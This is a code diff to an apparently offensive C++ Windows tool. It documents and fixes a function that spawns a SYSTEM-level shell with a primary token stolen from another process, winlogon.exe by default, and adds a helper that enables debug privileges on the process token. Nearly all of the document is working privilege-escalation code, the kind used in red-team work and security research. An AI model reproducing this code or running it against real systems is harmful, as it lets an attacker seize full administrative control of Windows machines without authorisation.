@@ -82,6 +82,15 @@ HANDLE GetToken(DWORD pid)
     return (HANDLE)NULL;
 }
 
+/*
+* Purpose:
+*   Spwans a system shell with a primary token stolen from the targeted process (default target winlogon.exe)
+* Arguments:
+*   token - Pointer to the primary token from the targeted process, this will be duplicated and injected into our new process
+*   pid - PID of the targeted process, this is not needed to spawn the new process, but is good for output.
+* Output:
+*   Boolean value signifing success or failure
+*/
 BOOL SpawnSystemShell(HANDLE token, DWORD pid)
 {
     if (token != NULL)
@@ -118,22 +127,54 @@ BOOL SpawnSystemShell(HANDLE token, DWORD pid)
             if (!start_result)
             {
                 std::cout << "[!] Failed to start elevated proccess Error: " << GetLastError() << std::endl;
-                return 1;
+                return FALSE;
             }
             else
             {
                 std::cout << "[*] Success! " << std::endl;
+                return TRUE;
             }
         }
         else
         {
             std::cout << "[!] Token from: " << pid << " Not Duplicated Error: " << " " << GetLastError() << std::endl;
-            return 1;
+            return FALSE;
         }
     }
     else
     {
         std::cout << "[!] NULL Token Provided: " << pid << " Not Duplicated Error: " << " " << GetLastError() << std::endl;
-        return 1;
+        return FALSE;
     }
+}
+
+//
+//  SetPrivilege enables/disables process token privilege.
+//
+BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
+{
+    LUID luid;
+    BOOL bRet = FALSE;
+
+    if (LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
+    {
+        TOKEN_PRIVILEGES tp;
+
+        tp.PrivilegeCount = 1;
+        tp.Privileges[0].Luid = luid;
+        tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;
+        //
+        //  Enable the privilege or disable all privileges.
+        //
+        if (AdjustTokenPrivileges(hToken, FALSE, &tp, NULL, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
+        {
+            //
+            //  Check to see if you have proper access.
+            //  You may get "ERROR_NOT_ALL_ASSIGNED".
+            //
+            bRet = (GetLastError() == ERROR_SUCCESS);
+        }
+    }
+    std::cout << "[*] Adjusted Debug Privs" << std::endl;
+    return bRet;
 }
